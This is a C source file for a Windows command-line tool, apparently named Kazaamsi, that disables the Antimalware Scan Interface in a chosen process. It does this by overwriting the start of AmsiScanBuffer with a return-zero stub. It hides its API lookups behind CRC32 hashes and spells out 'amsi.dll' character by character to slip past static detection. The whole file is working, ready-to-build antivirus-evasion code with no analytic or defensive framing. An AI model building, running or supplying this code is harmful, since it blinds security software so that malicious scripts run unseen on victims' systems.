#include <Windows.h>
#include <stdio.h>
#include <TlHelp32.h>
#include "structs.h"
#include "hashutils.h"
#include "k32utils.h"

#define     KERNEL32_CRC32                    0x998B531E
#define     LOADLIBRARYA_CRC32                0x70DA6DFB
#define     VIRTUALPROTECTEX_CRC32            0x2980E6B1
#define     OPENPROCESS_CRC32                 0x1B0575E8
#define     WRITEPROCESSMEMORY_CRC32          0xA1FBD4C9
#define     CREATETOOLHELP32SNAPSHOT_CRC32    0x8E92CBEB
#define     MODULE32FIRSTW_CRC32              0x0B70DE17
#define     MODULE32NEXTW_CRC32               0x0512F06C
#define     CLOSEHANDLE_CRC32                 0xBCA00DFD
#define     AMSI_CRC32                        0x6EE8B961
#define     AMSISCANBUFFER_CRC32              0x2513690A


BOOL g_Verbose = TRUE;  // Set to FALSE for silent mode

BOOL GetFunctions() {
    DWORD   k32hash = KERNEL32_CRC32;
    HMODULE hKernel32 = GetModuleHandleH(k32hash);

    if (!hKernel32) {
        printf("[!] Failed to locate kernel32.dll.\n");
        return FALSE;
    }
    if (g_Verbose)
        printf("[>] Found kernel32.dll at: 0x%p\n", hKernel32);

    fnLoadLibraryA = (pLoadLibraryA)GetProcAddressH(hKernel32, LOADLIBRARYA_CRC32);
    fnVirtualProtectEx = (pVirtualProtectEx)GetProcAddressH(hKernel32, VIRTUALPROTECTEX_CRC32);
    fnWriteProcessMemory = (pWriteProcessMemory)GetProcAddressH(hKernel32, WRITEPROCESSMEMORY_CRC32);
    fnCreateToolhelp32Snapshot = (pCreateToolhelp32Snapshot)GetProcAddressH(hKernel32, CREATETOOLHELP32SNAPSHOT_CRC32);
    fnModule32FirstW = (pModule32FirstW)GetProcAddressH(hKernel32, MODULE32FIRSTW_CRC32);
    fnModule32NextW = (pModule32NextW)GetProcAddressH(hKernel32, MODULE32NEXTW_CRC32);
    fnCloseHandle = (pCloseHandle)GetProcAddressH(hKernel32, CLOSEHANDLE_CRC32);
    fnOpenProcess = (pOpenProcess)GetProcAddressH(hKernel32, OPENPROCESS_CRC32);

    if (!fnLoadLibraryA || !fnVirtualProtectEx || !fnWriteProcessMemory ||
        !fnCreateToolhelp32Snapshot || !fnModule32FirstW ||
        !fnModule32NextW || !fnCloseHandle || !fnOpenProcess) {
        printf("[!] Failed to resolve one or more kernel32 functions.\n");
        return FALSE;
    }

    if (g_Verbose) {
        printf("[>] LoadLibraryA: 0x%p\n", (PVOID)fnLoadLibraryA);
        printf("[>] VirtualProtectEx: 0x%p\n", (PVOID)fnVirtualProtectEx);
        printf("[>] WriteProcessMemory: 0x%p\n", (PVOID)fnWriteProcessMemory);
        printf("[>] CreateToolhelp32Snapshot: 0x%p\n", (PVOID)fnCreateToolhelp32Snapshot);
        printf("[>] Module32FirstW: 0x%p\n", (PVOID)fnModule32FirstW);
        printf("[>] Module32NextW: 0x%p\n", (PVOID)fnModule32NextW);
        printf("[>] CloseHandle: 0x%p\n", (PVOID)fnCloseHandle);
        printf("[>] OpenProcess: 0x%p\n", (PVOID)fnOpenProcess);
    }

    return TRUE;
}


PVOID GetRemoteModBase(DWORD targetPid, DWORD moduleHash) {
    
    MODULEENTRY32   modEntry        =   { 0 };
                    modEntry.dwSize =   sizeof(modEntry);

    HANDLE hSnapshot = fnCreateToolhelp32Snapshot(TH32CS_SNAPMODULE, targetPid);

    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("[!] CreateToolhelp32Snapshot failed. Error: %d\n", GetLastError());
        return NULL;
    }
    // Convert to ascii then compare hash
    if (fnModule32FirstW(hSnapshot, &modEntry)) {
        do {
                char    modNameA[MAX_PATH]         = { 0 },
                        upperModNameA[MAX_PATH]    = { 0 };
                DWORD   thisModHash;

            WideCharToMultiByte(CP_ACP, 0, modEntry.szModule, -1, modNameA, MAX_PATH, NULL, NULL);
            CharBufToUpper(upperModNameA, modNameA, sizeof(upperModNameA));
            
            // Hash and compare
            thisModHash = CRC32(upperModNameA);
            
            if (thisModHash == moduleHash) {
                CloseHandle(hSnapshot);
                return modEntry.modBaseAddr;
            }
        } while (fnModule32NextW(hSnapshot, &modEntry));
    }

    CloseHandle(hSnapshot);
    return NULL;
}

PVOID GetRemoteFuncAddr(IN DWORD dwTargetPid) {  
    
    char dllNameA[]      =      { 'a','m','s','i','.','d','l','l', 0 };

    HMODULE hLocalMod = fnLoadLibraryA(dllNameA);
    if (!hLocalMod) {
        printf("[!] LoadLibraryA failed. Error: %d\n", GetLastError());
        return NULL;
    }

    PBYTE localFuncAddr = (PBYTE)GetProcAddressH(hLocalMod, AMSISCANBUFFER_CRC32);
    if (!localFuncAddr) {
        printf("[!] GetProcAddress failed. Error: %d\n", GetLastError());
        return NULL;
    }
    SIZE_T funcOffset = (SIZE_T)(localFuncAddr - (PBYTE)hLocalMod);

    PBYTE remoteBaseAddr = (PBYTE)GetRemoteModBase(dwTargetPid, AMSI_CRC32);
    if (!remoteBaseAddr) {
        printf("[!] Failed to find target module in remote process.\n");
        return NULL;
    }

    PVOID remoteFuncAddr = remoteBaseAddr + funcOffset;
    if (g_Verbose)
        printf("[>] Remote AmsiScanBuffer address: 0x%p\n", remoteFuncAddr);

    return remoteFuncAddr;
}

BOOL PatchRemoteFunc(HANDLE hProcess, PVOID pRemoteFuncAddr) {   

    char patchBytes[] = { 0x31, 0xC0, 0xC3 };
    
    PVOID  pageBase = pRemoteFuncAddr;
    SIZE_T pageSize = 0x1000;
    DWORD  oldProtect = 0;

    // change page to read/write
    if (!fnVirtualProtectEx(hProcess, pageBase, pageSize, PAGE_READWRITE, &oldProtect)) {
        printf("[!] VirtualProtectEx failed: %u\n", GetLastError());
        return FALSE;
    }

    // write patch bytes
    if (!fnWriteProcessMemory(hProcess, pRemoteFuncAddr, patchBytes, sizeof(patchBytes), NULL)) {
        printf("[!] WriteProcessMemory failed: %u\n", GetLastError());
        return FALSE;
    }

    // restore original protection
    if (!fnVirtualProtectEx(hProcess, pageBase, pageSize, oldProtect, &oldProtect)) {
        printf("[!] VirtualProtectEx (restore) failed: %u\n", GetLastError());
        return FALSE;
    }

    printf("[>] Patch applied successfully.\n");
    return TRUE;

}

int main(int argc, char** argv) {

    DWORD targetPid = 0;
    PVOID p0x2513690A = NULL;

    // Handle command line args
    if (argc < 2 || argc > 3) {
        printf("Usage: Kazaamsi.exe <PID> [-v]\n");
        return -1;
    }

    // Parse PID
    targetPid = strtoul(argv[1], NULL, 10);
    if (targetPid == 0) {
        printf("[!] Invalid PID: %s\n", argv[1]);
        return -1;
    }

    // Optional verbose flag
    g_Verbose = (argc == 3 && strcmp(argv[2], "-v") == 0);

    if (!GetFunctions()) {
        printf("[!] Could not resolve APIs.\n");
        return -1;
    }

    p0x2513690A = GetRemoteFuncAddr(targetPid);
    if (!p0x2513690A) {
        printf("[!] Failed to calculate remote address of AmsiScanBuffer.\n");
        return -1;
    }

    if (g_Verbose)
        printf("[>] Opening handle to PID %lu...\n", targetPid);

    HANDLE hProcess = fnOpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, targetPid);
    if (!hProcess) {
        printf("[!] OpenProcess failed. Error: %d\n", GetLastError());
        return -1;
    }

    if (g_Verbose)
        printf("[>] Applying patch to remote process...\n");

    if (!PatchRemoteFunc(hProcess, p0x2513690A)) {
        CloseHandle(hProcess);
        return -1;
    }

    if (g_Verbose)
        printf("[>] Cleaning up...\n");

    CloseHandle(hProcess);
    return 0;
}
